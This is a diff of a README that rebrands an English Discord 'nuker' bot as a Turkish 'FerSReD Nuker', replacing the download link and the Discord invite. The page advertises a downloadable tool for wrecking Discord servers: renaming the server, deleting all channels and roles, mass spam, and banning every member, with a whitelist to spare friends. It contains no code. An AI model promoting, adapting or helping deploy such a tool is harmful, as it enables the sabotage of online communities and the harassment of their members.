@@ -1,27 +1,21 @@
-# Five nuker | Download [here](https://github.com/glitch65/Five-nuker/raw/Rework/release.zip)
+# FerSReD Nuker | [Buradan] indirin(https://github.com/FerSReD98/fersred-nuker/raw/Rework/release.zip)
 
-# ❓ Have any questions or problems? Contact us to discord server or create an issue
-> Our Discord: https://discord.gg/QTDXqt8PA8
+❓ # Herhangi bir sorunuz veya sorununuz mu var? Discord sunucusu için bizimle iletişime geçin veya bir sorun oluşturun
+> Discord: https://discord.gg/fersredofficial
 
-# 💫 A nuker bot for discord that can:
+💫 # Discord için şunları yapabilen bir patlatıcı bot:
 
-1. Rename Server & Add custom server icon
-2. Delete all Chanells and roles
-3. Spam roles and channel with custom name
-4. Spam in Spam channels with custom message
-5. Ban everyone with custom reason
-6. Give you (or everyone on the server) admin perms -> Not available in the reborn version yet
-7. Create fake commands -> Not available in the reborn version yet
-8. Automatically nuke the server when adding a bot -> Not available in the reborn version yet
+1. Sunucuyu Yeniden Adlandır ve Özel sunucu simgesi ekle
+2. Tüm Chanell'leri ve rolleri silin
+3. Spam rolleri ve özel ada sahip kanal
+4. Özel mesaj içeren spam kanallarında spam
+5. Herkesi özel sebeple banlayın
 
-> [!NOTE]
-> Do you want to use the legacy version? You can download it [here](https://github.com/glitch65/Discord-Five-nuker-bot/raw/launcher/launcher.exe) (it will ask for updates, but you just ignore it and that's it).
+# Ayrıca:
+1. Bu bot tamamen özelleştirilebilir 
+2. Botun onları yasaklamaması için arkadaşlarınızı beyaz listeye ekleyebilirsiniz
 
-# Also:
-1. This bot is fully customizable 
-2. You can add your friends to the white list so that the bot does not ban them
-
-# ❤ Like my bot? Then add a star to my repository and join my discord server so you support me and help promote the bot ❤
-> You can also find announcements, tutorials, information about the bot (how to configure some functions or ask for help), or just chat with me or other server members
-> https://discord.gg/QTDXqt8PA8 
+# ❤ Botumu beğendiniz mi? Ardından depoma bir yıldız ekleyin ve discord sunucuma katılın, böylece beni destekleyin ve botun ❤ tanıtımına yardımcı olun.
+> Ayrıca duyurular, öğreticiler, bot hakkında bilgiler (bazı işlevlerin nasıl yapılandırılacağı veya yardım isteneceği) bulabilir veya sadece benimle veya diğer sunucu üyeleriyle sohbet edebilirsiniz
+> https://discord.gg/fersredofficial
 
